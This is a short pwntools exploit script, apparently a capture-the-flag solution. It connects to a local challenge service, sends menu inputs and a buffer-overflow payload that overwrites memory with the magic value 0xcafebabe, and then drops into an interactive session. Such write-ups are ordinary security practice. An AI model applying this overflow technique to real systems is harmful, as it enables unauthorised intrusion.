from pwn import *

# p = process("./bin/ghost")
p = remote('localhost',30096)
# 0xcafebabe
# 0x1337c0de
# payload = b'A'*8 + p32(0xcafebabe)
payload = b'a'*8 + p64(0xcafebabe)

# p.sendline(b'16')
p.sendline(b'16')
p.sendline(b'48')
p.sendline(payload)


p.interactive()